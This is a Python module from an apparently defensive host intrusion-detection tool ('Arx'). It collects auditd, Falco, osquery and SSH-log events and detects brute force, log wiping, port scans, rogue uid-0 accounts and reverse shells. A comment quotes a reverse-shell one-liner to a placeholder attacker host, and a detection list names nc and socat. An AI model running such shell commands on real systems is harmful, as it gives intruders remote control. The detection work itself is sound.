"""Arx · sensors — capa de sensores del sistema con degradación.

Detecta y usa lo que haya en el host, con fallback a los colectores base de `recon`:
  · osquery   — consultas SQL al estado del sistema (multiplataforma).
  · auditd    — eventos de syscalls/ficheros (Linux) con reglas PROPIAS de Arx (claves
                arx_ident / arx_canary / arx_denied), leídos de forma incremental del propio log.
  · Falco     — comportamiento en kernel/eBPF (Linux); su JSONL se lee por offset.

INCREMENTAL: cada barrido entrega solo los eventos nuevos desde el anterior. El primer
barrido fija el punto de partida y no re-emite la historia (evita la inundación inicial).

Todo degrada: si un sensor no está, su colector devuelve [] y `guard` sigue con la
detección por anomalía de la baseline.
"""
from __future__ import annotations

import json
import os
import re
import shutil
import subprocess
import time
from pathlib import Path

from arx import config
from arx.i18n import tr
from arx.modules import recon

FALCO_LOG = "/var/log/falco/events.json"
MAX_EVENTS = 20  # por sensor y barrido: una avalancha se resume, no se vuelca entera

_FALCO_SEV = {
    "Emergency": "crit", "Alert": "crit", "Critical": "crit", "Error": "high",
    "Warning": "med", "Notice": "low", "Informational": "info", "Debug": "info",
}

# Ficheros de identidad vigilados por auditd (escritura/atributos).
IDENT_WATCH = ["/etc/passwd", "/etc/shadow", "/etc/group", "/etc/sudoers", "/etc/sudoers.d",
               "/root/.ssh"]


def available() -> dict:
    return {
        "osquery": bool(shutil.which("osqueryi")),
        "auditd": bool(shutil.which("ausearch") and shutil.which("auditctl")),
        "falco": bool(shutil.which("falco")) or Path(FALCO_LOG).exists(),
    }


def osquery(sql: str, timeout: int = 10) -> list[dict] | None:
    if not shutil.which("osqueryi"):
        return None
    out = recon._run(["osqueryi", "--json", sql], timeout=timeout)
    if out is None:
        return None
    try:
        return json.loads(out)
    except ValueError:
        return None


# ── Falco (JSONL por offset) ─────────────────────────────────────────────────
def _cursor_path():
    return config.state_dir() / "sensor_cursors.json"


def _tail_new(path: str, name: str) -> tuple[list[str], bool]:
    """(Líneas añadidas a `path` desde la última lectura, hubo_truncado).

    Detecta rotación (cambio de inode: normal, logrotate) y TRUNCADO (mismo inode,
    tamaño menor: alguien vació el log — anti-forense clásico, ver lab L9).
    El primer barrido arranca al final y no re-emite la historia.
    """
    cursors = config.read_json(_cursor_path())
    cur = cursors.get(name)
    try:
        st = os.stat(path)
    except OSError:
        return [], False
    if cur is None:  # primera vez: arrancar al final, no re-emitir la historia
        cursors[name] = {"ino": st.st_ino, "off": st.st_size}
        config.write_json(_cursor_path(), cursors)
        return [], False
    tampered = cur.get("ino") == st.st_ino and st.st_size < cur.get("off", 0)
    off = cur.get("off", 0) if cur.get("ino") == st.st_ino and not tampered else 0
    try:
        with open(path, "rb") as f:
            f.seek(off)
            data = f.read(4 * 1024 * 1024)
    except OSError:
        return [], False
    # no partir una línea a medias: avanzar solo hasta el último salto de línea completo
    cut = data.rfind(b"\n") + 1
    cursors[name] = {"ino": st.st_ino, "off": off + cut}
    config.write_json(_cursor_path(), cursors)
    return data[:cut].decode("utf-8", "replace").splitlines(), tampered


def read_falco_events(path: str = FALCO_LOG) -> list[dict]:
    """Eventos Falco NUEVOS (requiere json_output=true en su config)."""
    events = []
    lines, _ = _tail_new(path, "falco")
    for line in lines[-MAX_EVENTS:]:
        try:
            e = json.loads(line)
        except ValueError:
            continue
        events.append(
            {
                "sev": _FALCO_SEV.get(e.get("priority", ""), "med"),
                "kind": "falco",
                "detail": f"Falco · {e.get('rule', '?')}: {e.get('output', '')}"[:400],
                "why": tr("Falco behavior rule fired"),
            }
        )
    return events


# ── auditd (reglas propias + checkpoint) ─────────────────────────────────────
def _is_root() -> bool:
    return hasattr(os, "geteuid") and os.geteuid() == 0


# B50: fanotify solo ve las aperturas que el kernel permite (la comprobación de permisos va antes del evento).
# Una regla de syscall de auditd sí registra el intento denegado sobre el propio fichero.
DENIED_KEY = "arx_denied"
DENIED_SYSCALLS = ("openat", "open", "openat2")  # no todas existen en cada arquitectura: cada una se prueba
DENIED_MAX_PATHS = 64


def _audit_arch() -> str:
    import sys
    return "b64" if sys.maxsize > 2 ** 32 else "b32"


def ensure_audit_rules(canary_paths: list[str] | None = None) -> bool:
    """Instala (idempotente) las reglas de Arx en auditd. Requiere root + auditctl."""
    if not (_is_root() and shutil.which("auditctl")):
        return False
    current = recon._run(["auditctl", "-l"]) or ""
    wanted = [(p, "wa", "arx_ident") for p in IDENT_WATCH if os.path.exists(p)]
    wanted += [(p, "rwa", "arx_canary") for p in (canary_paths or []) if os.path.exists(p)]
    for path, perm, key in wanted:
        if f"-w {path} " in current and f"-k {key}" in current:
            continue
        subprocess.run(["auditctl", "-w", path, "-p", perm, "-k", key],
                       capture_output=True, text=True, timeout=10)
    from arx.modules import filewatch  # perezoso: los mismos ficheros que vigila fanotify
    for path in filewatch.sensitive_files()[:DENIED_MAX_PATHS]:
        if any(f"path={path} " in f"{line} " and f"key={DENIED_KEY}" in line for line in current.splitlines()):
            continue
        for syscall in DENIED_SYSCALLS:
            subprocess.run(["auditctl", "-a", "always,exit", "-F", f"arch={_audit_arch()}", "-S", syscall,
                            "-F", f"path={path}", "-F", "success=0", "-k", DENIED_KEY],
                           capture_output=True, text=True, timeout=10)
    return True


# Lectura incremental PROPIA del log de auditd. `ausearch --checkpoint` no entrega los eventos nuevos en auditd 4.0
# (Debian 13, medido: rc=1 y cero líneas con los eventos ya escritos en el log), y Arx dejaba de ver las tres claves.
# Se sigue el fichero por dispositivo+inodo+desplazamiento, como el JSONL de Falco, y se sobrevive a su rotación.
AUDIT_CONF = "/etc/audit/auditd.conf"
AUDIT_LOG = "/var/log/audit/audit.log"
AUDIT_TAIL_STATE = "audit-tail.json"
AUDIT_KEYS = ("arx_ident", "arx_canary", DENIED_KEY)
AUDIT_READ_MAX = 8 << 20   # por barrido: un atasco se drena en varios barridos, no se salta
AUDIT_QUEUE_MAX = 200      # eventos pendientes por clave
AUDIT_YOUNG_S = 2.0        # el último evento del fichero, si es así de reciente, puede estar a medio escribir
_AUDIT_EVENT = re.compile(r"msg=audit\(([\d.]+):(\d+)\)")
_AUDIT_KEY = re.compile(r' key="([^"]*)"')
_audit_pending: dict[str, list[list[str]]] = {}


def _audit_log_path() -> str:
    try:
        with open(AUDIT_CONF, encoding="utf-8", errors="replace") as f:
            for line in f:
                name, sep, value = line.partition("=")
                if sep and name.strip() == "log_file" and value.strip():
                    return value.strip()
    except OSError:
        pass
    return AUDIT_LOG


def _audit_save(dev: int, ino: int, off: int) -> None:
    p = config.state_dir() / AUDIT_TAIL_STATE
    try:
        tmp = p.with_suffix(".tmp")
        tmp.write_text(json.dumps({"dev": dev, "ino": ino, "off": off}))
        os.replace(tmp, p)
    except OSError:
        pass


def _audit_poll(now: float | None = None) -> None:
    """Lee lo que auditd ha añadido desde la vez anterior y encola los eventos de las claves de Arx. El primer
    barrido solo fija el punto de partida (no re-emite la historia)."""
    path = _audit_log_path()
    try:
        st = os.stat(path)
    except OSError:
        return
    try:
        saved = json.loads((config.state_dir() / AUDIT_TAIL_STATE).read_text())
        saved = (int(saved["dev"]), int(saved["ino"]), int(saved["off"]))
    except (OSError, ValueError, TypeError, KeyError):
        for old in config.state_dir().glob("ausearch-*.ckpt"):  # los checkpoints de ausearch ya no se usan
            old.unlink(missing_ok=True)
        _audit_save(st.st_dev, st.st_ino, st.st_size)
        return
    dev, ino, off = saved
    segments = []  # (ruta, desde, ¿es el fichero vivo?)
    if (dev, ino) == (st.st_dev, st.st_ino):
        segments.append((path, off if off <= st.st_size else 0, True))  # más corto: lo truncaron, desde el principio
    else:  # rotado: lo que faltaba por leer sigue en el fichero anterior
        try:
            old = os.stat(path + ".1")
            if (old.st_dev, old.st_ino) == (dev, ino):
                segments.append((path + ".1", min(off, old.st_size), False))
        except OSError:
            pass
        segments.append((path, 0, True))
    budget, lines, state = AUDIT_READ_MAX, [], None
    for seg_path, start, live in segments:
        try:
            with open(seg_path, "rb") as f:
                f.seek(start)
                data = f.read(budget)
                fst = os.fstat(f.fileno())
        except OSError:
            break
        budget -= len(data)
        at_end = start + len(data) >= fst.st_size
        used = len(data) if at_end and not live else data.rfind(b"\n") + 1  # en el vivo, la línea a medias espera
        pos, seg_lines = start, []
        for raw in data[:used].split(b"\n")[:-1] if used else []:
            seg_lines.append((pos, raw.decode("utf-8", "replace")))
            pos += len(raw) + 1
        if not live and used and not data[:used].endswith(b"\n"):  # fichero rotado sin salto final
            seg_lines.append((pos, data[pos - start:used].decode("utf-8", "replace")))
        end = start + used
        m = _AUDIT_EVENT.search(seg_lines[-1][1]) if seg_lines and (live or not at_end) else None
        if m:  # el último evento puede estar incompleto: recién escrito, o cortado por el presupuesto de lectura
            first = next(i for i, (_, text) in enumerate(seg_lines) if m.group(0) in text)
            young = live and at_end and (time.time() if now is None else now) - float(m.group(1)) < AUDIT_YOUNG_S
            if young or (not at_end and first > 0):  # se relee entero en el barrido siguiente
                end = seg_lines[first][0]
                seg_lines = seg_lines[:first]
        lines += [text for _, text in seg_lines]
        state = (fst.st_dev, fst.st_ino, end)
        if not at_end or budget <= 0:
            break
    if state is None:
        return
    keyed: dict[str, str] = {}
    for text in lines:
        if text.startswith("type=SYSCALL") and ' key="arx_' in text:
            k, e = _AUDIT_KEY.search(text), _AUDIT_EVENT.search(text)
            if k and e and k.group(1) in AUDIT_KEYS:
                keyed[e.group(0)] = k.group(1)
    if keyed:
        grouped: dict[str, list[str]] = {}
        for text in lines:
            e = _AUDIT_EVENT.search(text)
            if e and e.group(0) in keyed:
                grouped.setdefault(e.group(0), []).append(text)
        for event_id, records in grouped.items():
            queue = _audit_pending.setdefault(keyed[event_id], [])
            queue.append(records)
            del queue[:-AUDIT_QUEUE_MAX]
    _audit_save(*state)


def _audit_new(key: str) -> list[list[str]]:
    """Eventos nuevos (cada uno, sus registros crudos) de una clave de Arx."""
    _audit_poll()
    return _audit_pending.pop(key, [])


def _audit_text(events: list[list[str]]) -> list[str]:
    """Una línea legible por evento: la de `ausearch --format text` (lee los registros por stdin); sin él, un
    resumen de los campos."""
    if not events:
        return []
    if shutil.which("ausearch"):
        try:
            r = subprocess.run(["ausearch", "--format", "text"], input="".join(l + "\n" for ev in events for l in ev),
                               capture_output=True, text=True, timeout=15)
            out = [l.strip() for l in r.stdout.splitlines() if l.strip()]
            if r.returncode == 0 and len(out) == len(events):
                return out
        except (OSError, subprocess.TimeoutExpired):
            pass
    summary = []
    for ev in events:
        sc, name = {}, "?"
        for line in ev:
            fields = {k: _audit_value(k, v) for k, v in _AUDIT_FIELD.findall(line)}
            if line.startswith("type=SYSCALL"):
                sc = fields
            elif line.startswith("type=PATH") and name == "?" and fields.get("name"):
                name = fields["name"]
        summary.append(f"{sc.get('exe', '?')} (pid {sc.get('pid', '?')}, uid {sc.get('uid', '?')}, "
                       f"success={sc.get('success', '?')}) {name}")
    return summary


_AUDIT_FIELD = re.compile(r'(\w+)=("[^"]*"|\S+)')
_AUDIT_SERIAL = re.compile(r"msg=audit\([\d.]+:(\d+)\)")


_AUDIT_HEX_FIELDS = {"name", "cwd", "exe", "comm", "proctitle"}


def _audit_value(key: str, value: str) -> str:
    """auditd cita los valores normales y codifica en hexadecimal, solo en campos de texto (rutas, nombres),
    los que llevan espacios o bytes raros. Un pid o un uid son números: nunca se decodifican."""
    if value.startswith('"'):
        return value.strip('"')
    if key in _AUDIT_HEX_FIELDS and len(value) % 2 == 0 and re.fullmatch(r"(?:[0-9A-F]{2})+", value):
        try:
            return bytes.fromhex(value).decode("utf-8", "replace")
        except ValueError:
            return value
    return value


def _unit_of_pid(pid: str) -> str | None:
    try:
        with open(f"/proc/{int(pid)}/cgroup", encoding="utf-8") as f:
            for line in f:
                if line.startswith("0::"):
                    last = line.strip()[3:].rsplit("/", 1)[-1]
                    return last if last.endswith(".service") else None
    except (OSError, ValueError):
        return None
    return None


def read_denied_opens(lines: list[str] | None = None) -> list[dict]:
    """Intentos DENEGADOS de abrir un fichero sensible (B50): fanotify no los ve; auditd sí."""
    import pwd
    lines = [line for ev in _audit_new(DENIED_KEY) for line in ev] if lines is None else lines
    events: dict[str, dict] = {}
    for line in lines:
        m = _AUDIT_SERIAL.search(line)
        if not m:
            continue
        rec = events.setdefault(m.group(1), {"syscall": None, "names": [], "cwd": ""})
        fields = {k: _audit_value(k, v) for k, v in _AUDIT_FIELD.findall(line)}
        if line.startswith("type=SYSCALL"):
            rec["syscall"] = fields
        elif line.startswith("type=PATH") and fields.get("name"):
            rec["names"].append(fields["name"])
        elif line.startswith("type=CWD"):
            rec["cwd"] = fields.get("cwd", "")
    out = []
    for rec in events.values():
        sc = rec["syscall"]
        # root no es la señal (puede leerlo todo), lo permitido ya lo cuenta fanotify, y una sesión de login (auid
        # puesto: un admin que olvidó sudo) no cuenta, como en filewatch: solo servicios y lo que lanzan
        if not sc or sc.get("success") != "no" or sc.get("uid") in (None, "0") \
                or sc.get("auid", "4294967295") not in ("4294967295", "-1"):
            continue
        name = rec["names"][0] if rec["names"] else "?"
        path = name if name.startswith("/") or not rec["cwd"] else os.path.join(rec["cwd"], name)
        uid, pid, exe = sc.get("uid", "?"), sc.get("pid", "?"), sc.get("exe", "?")
        try:
            who = pwd.getpwuid(int(uid)).pw_name
        except (KeyError, ValueError):
            who = f"uid {uid}"
        unit = _unit_of_pid(pid)
        out.append({
            "sev": "high", "kind": "sensitive_denied",
            "detail": tr("{who} tried to open {file} and the kernel denied it ({exe}, pid {pid}{unit})",
                         who=who, file=path, exe=exe, pid=pid, unit=f", {unit}" if unit else ""),
            "why": tr("a process reaching for passwords or keys it may not read is what an intruder probing "
                      "the host does; the kernel stopped it, Arx tells you"),
            "target": {"pid": int(pid) if str(pid).isdigit() else None, "exe": exe, "file": path, "uid": uid,
                       **({"unit": unit} if unit else {})},
            "fp_key": f"sensitive_denied|{exe}|{path}|{uid}"})
    return out[-MAX_EVENTS:]


def read_auditd_events() -> list[dict]:
    events = []
    for line in _audit_text(_audit_new("arx_ident")[-MAX_EVENTS:]):
        events.append({"sev": "high", "kind": "auditd", "detail": tr("auditd · identity: {line}",
                                                                     line=line)[:400],
                       "fp_key": "auditd|" + f"auditd · identidad: {line}"[:400],
                       "why": tr("write/attribute change on an identity or privilege file")})
    for line in _audit_text(_audit_new("arx_canary")[-MAX_EVENTS:]):
        events.append({"sev": "high", "kind": "canary", "detail": tr("canary accessed · {line}",
                                                                     line=line)[:400],
                       "fp_key": "canary|" + f"señuelo accedido · {line}"[:400],
                       "why": tr("nobody legitimate opens a honeytoken: the access came from the "
                                 "process shown")})
    return events


def collect_events() -> list[dict]:
    """Todos los eventos NUEVOS de sensores disponibles, normalizados."""
    return (read_falco_events() + read_auditd_events() + read_denied_opens() + read_auth_log()
            + detect_port_scan() + detect_reverse_shell())


# ── auth.log / secure: fuerza bruta SSH + anti-forense (cierra GAP L2) ───────
AUTH_LOGS = ["/var/log/auth.log", "/var/log/secure"]  # Debian/Ubuntu · RHEL/Fedora
AUTH_FAIL_RE = re.compile(
    r"Failed password for (?:invalid user )?(\S+) from ([0-9a-fA-F.:]+)")
# `who` solo ve sesiones con terminal: un `ssh -T`, un `scp` o un túnel no aparecen en él.
AUTH_OK_RE = re.compile(
    r"Accepted [\w/@.-]+ for (\S+) from ([0-9a-fA-F.:]+)")
AUTH_WINDOW_S = 600     # 10 min de memoria
AUTH_THRESHOLD = 6      # fallos desde una misma IP dentro de la ventana

# ── escaneo de puertos por conexiones (procfs) — GAP L1 ──────────────────────
SCAN_WINDOW_S = 600
SCAN_THRESHOLD = 8      # puertos locales distintos tocados por una misma IP


def _window_path(name: str):
    return config.state_dir() / f"sensor-window-{name}.json"


def _prune(win: dict, now: float, ttl: int) -> dict:
    return {k: v for k, v in win.items() if now - v.get("t", 0) <= ttl}


def login_finding(item: str) -> dict:
    """Un acceso `cuenta@origen` que la base no conoce (mismo hallazgo venga de donde venga)."""
    return {"sev": "high", "kind": "login_users", "detail": tr("new in login_users: {item}",
                                                               item=item),
            "why": tr("access from an account or origin the baseline does not know"),
            "target": {"user": item}, "set": "login_users", "item": item,
            "fp_key": f"login_users|nuevo en login_users: {item}"}


def accepted_logins(path: str | None = None, limit: int = 16 * 1024 * 1024) -> set[str]:
    """`cuenta@origen` de los accesos aceptados en auth.log. Lo usa el aprendizaje: si solo
    aprendiera de `who`, cada `ssh -T`, `scp` o Ansible legítimo saldría como acceso nuevo."""
    path = path or next((p for p in AUTH_LOGS if os.path.exists(p)), None)
    text = ""
    if path:
        try:
            with open(path, "rb") as f:
                f.seek(max(0, os.fstat(f.fileno()).st_size - limit))
                text = f.read(limit).decode("utf-8", "replace")
        except OSError:
            pass
    elif shutil.which("journalctl"):  # sin auth.log (Debian 12, instalación mínima)
        text = recon._run(["journalctl", "--no-pager", "-q", "-o", "cat", "--since", "-30d",
                           "_COMM=sshd", "_COMM=sshd-session", "_COMM=sshd-auth"], timeout=30) or ""
    return {f"{m.group(1)}@{m.group(2)}" for m in AUTH_OK_RE.finditer(text)}


def detect_uid0_accounts(known=(), accounts: list | None = None) -> list[dict]:
    """Toda cuenta con uid 0 distinta de root es root con otro nombre: una puerta trasera
    clásica. No se aprende nunca sola: si ya estaba al instalar, también se avisa."""
    if accounts is None:
        import pwd

        accounts = [(p.pw_name, p.pw_uid) for p in pwd.getpwall()]
    return [{"sev": "crit", "kind": "uid0_account",
             "detail": tr("account with uid 0 other than root: {name}", name=name),
             "why": tr("it has all of root's powers under another name; installed by someone who "
                       "wants to come back unnoticed. If legitimate, accept it"),
             "target": {"user": name}, "set": "uid0_accounts", "item": name,
             "fp_key": f"uid0_account|cuenta con uid 0 distinta de root: {name}"}
            for name, uid in accounts if uid == 0 and name != "root" and name not in known]


def _log_vanished(path: str | None) -> dict | None:
    """El log que se venía leyendo ya no está. Un rotado crea otro al instante; que no haya
    ninguno es que lo borraron. Se avisa una vez: el cursor se olvida para no repetirlo."""
    if path is not None:
        return None
    cursors = config.read_json(_cursor_path())
    if "authlog" not in cursors:
        return None
    del cursors["authlog"]
    config.write_json(_cursor_path(), cursors)
    return {"sev": "high", "kind": "log_tamper", "detail": tr("the authentication log disappeared"),
            "fp_key": "log_tamper|el log de autenticación desapareció",
            "why": tr("deleting the authentication log is anti-forensic: someone is wiping traces")}


def _journal_sshd_lines() -> list[str] | None:
    """Líneas nuevas de sshd según journald, o None si aquí no se puede.

    Mejor que el fichero: `_COMM` lo pone el kernel, así que un `logger` de cualquier usuario no
    las falsifica, y en Debian 12 o una instalación mínima no existe auth.log.

    El cursor inicial se toma con el MISMO filtro: journalctl avanza dos pasos desde el cursor, y
    si este no casa con el filtro se come la primera línea que sí casa (era justo el `Accepted`).
    """
    if not (shutil.which("journalctl") and os.path.exists("/run/systemd/journal/socket")):
        return None
    base = ["journalctl", "--no-pager", "-q", "-o", "cat"]
    match = ["_COMM=sshd", "_COMM=sshd-session", "_COMM=sshd-auth"]  # OpenSSH 10 separa la parte de antes de autenticar
    cursor = config.state_dir() / "journal-sshd.cursor"
    fresh = config.state_dir() / "journal-sshd.fresh"  # sshd aún no había escrito nada
    try:
        if not cursor.exists() and not fresh.exists():  # arrancar al final: sin re-emitir la historia
            r = subprocess.run([*base, "-n", "1", "--show-cursor", *match],
                               capture_output=True, text=True, errors="replace", timeout=15)
            if r.returncode != 0 and (r.stderr or "").strip():
                return None
            m = re.search(r"^-- cursor: (.+)$", r.stdout or "", re.M)
            fd = os.open(cursor if m else fresh, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
            with os.fdopen(fd, "w") as f:
                f.write(m.group(1) if m else "")
            return []
        r = subprocess.run([*base, f"--cursor-file={cursor}", *match],
                           capture_output=True, text=True, errors="replace", timeout=15)
    except (OSError, subprocess.TimeoutExpired):
        return None
    if r.returncode != 0 and (r.stderr or "").strip():
        cursor.unlink(missing_ok=True)  # cursor inválido, journal rotado o systemd < 242
        fresh.unlink(missing_ok=True)
        return None
    return (r.stdout or "").splitlines()


def read_auth_log(now: float | None = None) -> list[dict]:
    """Ráfagas de fallos de autenticación (sshd) y truncado del log de autenticación.

    La ventana es por IP de origen: un atacante que prueba muchos usuarios desde la
    misma IP sigue contando. El usuario atacado NO se toca automáticamente (Tier 1
    bloquea la IP; la rotación de credenciales es Tier 2).
    """
    path = next((p for p in AUTH_LOGS if os.path.exists(p)), None)
    lines, tampered = _tail_new(path, "authlog") if path else ([], False)
    vanished = _log_vanished(path)
    journal = _journal_sshd_lines()
    if journal is not None:
        lines = journal  # el fichero sigue vigilándose solo para detectar que lo vacían
    elif path is None:
        return [vanished] if vanished else []
    now = now if now is not None else time.time()
    events: list[dict] = [vanished] if vanished else []
    if tampered:
        events.append({
            "sev": "high", "kind": "log_tamper",
            "detail": tr("{path} was truncated (same inode, smaller size)", path=path),
            "fp_key": f"log_tamper|{path} fue truncado (mismo inode, tamaño menor)",
            "why": tr("emptying the authentication log is anti-forensic: someone is wiping traces"),
        })
    win = _prune(config.read_json(_window_path("auth"), {}), now, AUTH_WINDOW_S)
    for line in lines:
        ok = AUTH_OK_RE.search(line)
        if ok:
            events.append(login_finding(f"{ok.group(1)}@{ok.group(2)}"))
            continue
        m = AUTH_FAIL_RE.search(line)
        if not m:
            continue
        user, ip = m.group(1), m.group(2)
        e = win.setdefault(ip, {"t": now, "fails": 0, "users": {}})
        e["t"], e["fails"] = now, e["fails"] + 1
        e["users"][user] = e["users"].get(user, 0) + 1
    fired = []
    for ip, e in win.items():
        if e["fails"] >= AUTH_THRESHOLD and not e.get("fired"):
            e["fired"] = True  # una alerta por IP y ventana; la dedup de response hace el resto
            user = max(e["users"], key=e["users"].get)
            fired.append({
                "sev": "high", "kind": "auth_bruteforce",
                "detail": tr("{fails} authentication failures from {ip} (most tried user: {user})",
                             fails=e['fails'], ip=ip, user=user),
                "fp_key": f"auth_bruteforce|{e['fails']} fallos de autenticación desde {ip} "
                          f"(usuario más probado: {user})",
                "why": tr("brute force against the remote access service"),
                "target": {"ip": ip, "user": user},
            })
    config.write_json(_window_path("auth"), win)
    return events + fired


def _scan_from_nft() -> dict[str, set[int]] | None:
    """ip → {puertos tocados} según los sets de pista del kernel (inet arx scan4/6).

    La regla `tcp flags & (syn|ack) == syn → add @scanN { saddr . dport }` registra
    CADA SYN entrante, incluso contra puertos cerrados (no hace falta que nazca un
    socket): es la pista fiable para -sS y la que no pierde carreras contra servicios
    que cierran rápido. La ventana la mantiene el propio set (timeout 10m).
    Devuelve None si nftables no está disponible (el llamador degrada a procfs).
    """
    if not shutil.which("nft"):
        return None
    hits: dict[str, set[int]] = {}
    found = False
    for setname in ("scan4", "scan6"):
        try:
            r = subprocess.run(["nft", "list", "set", "inet", "arx", setname],
                               capture_output=True, text=True, timeout=10)
        except (OSError, subprocess.TimeoutExpired):
            continue
        if r.returncode != 0:
            continue  # la tabla aún no existe (primeros barridos): no es un error
        found = True
        for m in re.finditer(r"([0-9a-fA-F.:]+)\s*\.\s*(\d+)", r.stdout):
            hits.setdefault(m.group(1), set()).add(int(m.group(2)))
    return hits if found else None


def detect_port_scan(conns: list[dict] | None = None, now: float | None = None,
                     listen_ports: set[int] | None = None) -> list[dict]:
    """Una IP que toca muchos puertos locales distintos en poco tiempo = escaneo.

    Primario: la pista nft del kernel (`_scan_from_nft`) — ve SYNs aunque el puerto
    esté cerrado. Fallback (host sin nftables): ventana sobre /proc/net/tcp, que solo
    ve puertos que ACEPTARON conexión (límite honesto, lab/README).
    Nunca señala loopback ni las IPs propias del host.
    """
    now = now if now is not None else time.time()
    own = recon.local_ips()
    hits = _scan_from_nft()
    if hits is not None:
        events = []
        for ip, ports in sorted(hits.items()):
            if ip in own or len(ports) < SCAN_THRESHOLD:
                continue
            events.append({
                "sev": "high", "kind": "port_scan",
                "detail": tr("scan from {ip} (≥{SCAN_THRESHOLD} ports in 10 min, kernel trail)",
                             ip=ip, SCAN_THRESHOLD=SCAN_THRESHOLD),
                "fp_key": f"port_scan|escaneo desde {ip} (≥{SCAN_THRESHOLD} puertos en 10 min, pista kernel)",
                "why": tr("reconnaissance ahead of an attack: nobody legitimate touches this many "
                          "ports"),
                "target": {"ip": ip},
            })
        return events
    # ── fallback procfs: solo conexiones aceptadas a puertos en escucha ──
    # (las sesiones salientes tienen puerto local efímero y nunca cuentan)
    conns = recon.collect_connections() if conns is None else conns
    if listen_ports is None:
        listen_ports = set()
        for p in recon.collect_ports():
            try:
                listen_ports.add(int(str(p.get("local", "")).rsplit(":", 1)[-1]))
            except (ValueError, IndexError):
                continue
    win = _prune(config.read_json(_window_path("scan"), {}), now, SCAN_WINDOW_S)
    for c in conns:
        ip = c.get("remote_ip", "")
        if not ip or ip in own or c.get("local_port") not in listen_ports:
            continue
        e = win.setdefault(ip, {"t": now, "ports": []})
        e["t"] = now
        if c["local_port"] not in e["ports"]:
            e["ports"].append(c["local_port"])
    events = []
    for ip, e in win.items():
        if len(e["ports"]) >= SCAN_THRESHOLD and not e.get("fired"):
            e["fired"] = True
            events.append({
                "sev": "high", "kind": "port_scan",
                "detail": tr("scan from {ip} (≥{SCAN_THRESHOLD} accepted ports in 10 min)",
                             ip=ip, SCAN_THRESHOLD=SCAN_THRESHOLD),
                "fp_key": f"port_scan|escaneo desde {ip} (≥{SCAN_THRESHOLD} puertos aceptados en 10 min)",
                "why": tr("reconnaissance ahead of an attack: nobody legitimate touches this many "
                          "ports"),
                "target": {"ip": ip},
            })
    config.write_json(_window_path("scan"), win)
    return events


# ── reverse shell: intérprete con socket de red saliente (cierra GAP L6) ──────
# Un shell o una navaja de red (nc/socat) que POSEE un socket TCP establecido hacia
# un peer remoto es la firma del reverse shell (`bash -i >& /dev/tcp/atacante/4444`):
# un shell de login legítimo habla con sshd por un pty, nunca por un socket TCP propio,
# así que un bash/sh/nc con conexión de red es casi siempre C2. Los intérpretes de
# propósito general (python, perl, php) quedan FUERA a propósito: son servidores
# legítimos habituales y su reverse shell lo cazan los sensores de comportamiento
# (Falco/eBPF) en F8 — aquí se prefiere no dar falsos positivos (límite honesto).
SHELL_EXES = {"bash", "sh", "dash", "zsh", "ash", "busybox",
              "nc", "ncat", "netcat", "socat"}


def detect_reverse_shell(owners: list[dict] | None = None,
                         listen_ports: set[int] | None = None) -> list[dict]:
    """Shell/nc que posee una conexión TCP establecida SALIENTE = reverse shell.

    Correlación conexión→proceso vía `recon.connection_owners` (inode de socket →
    /proc/<pid>/exe). Nunca señala loopback ni las IPs propias del host. Solo cuentan
    las conexiones SALIENTES (puerto local efímero, no de escucha): una conexión
    ENTRANTE a un listener — aunque lo sirva nc — es un bind shell/servicio, no un
    reverse shell (el puerto nuevo en escucha ya lo caza el sensor de puertos, L4).
    Una alerta por canal C2 (exe · ip:puerto), con pid y exe para que la respuesta
    pueda bloquear el canal y suspender solo el proceso dueño.
    """
    owners = recon.connection_owners() if owners is None else owners
    own = recon.local_ips()
    if listen_ports is None:
        listen_ports = set()
        for p in recon.collect_ports():
            try:
                listen_ports.add(int(str(p.get("local", "")).rsplit(":", 1)[-1]))
            except (ValueError, IndexError):
                continue
    channels: dict[tuple, list] = {}
    for c in owners:
        exe = c.get("exe")
        ip = c.get("remote_ip", "")
        if not exe or c.get("state") != "ESTABLISHED" or not ip or ip in own:
            continue
        if c.get("local_port") in listen_ports:
            continue  # conexión ENTRANTE a un listener: no es un reverse shell saliente
        if exe.rsplit("/", 1)[-1] not in SHELL_EXES:
            continue
        # un canal, todos sus dueños: un hijo que hereda el socket también debe suspenderse
        channels.setdefault((exe, ip, c.get("remote_port")), []).append(c.get("pid"))
    from arx.modules import execwatch  # perezoso: el nacimiento distingue al dueño de un pid reutilizado
    events: list[dict] = []
    for (exe, ip, port), pids in channels.items():
        pids = sorted({p for p in pids if isinstance(p, int)})
        # B52: con su nacimiento, la respuesta sigue al dueño aunque haga exec a otro programa con el socket
        births = {str(p): st[1] for p in pids if (st := execwatch._stat(p))}
        events.append({
            "sev": "crit", "kind": "reverse_shell",
            "detail": tr("shell with an outbound connection: {exe} → {ip}:{port} (pid {v})",
                         exe=exe, ip=ip, port=port, v=', '.join(map(str, pids)) or '?'),
            "why": tr("a shell owning an outbound network socket is the C2 signature of a reverse "
                      "shell: nobody legitimate does this"),
            "target": {"ip": ip, "port": port, "exe": exe, "pids": pids, **({"births": births} if births else {})},
            # la huella no incluye el pid (cambia entre barridos); el canal C2 sí es estable
            "fp_key": f"reverse_shell|{exe}|{ip}:{port}",
        })
    return events
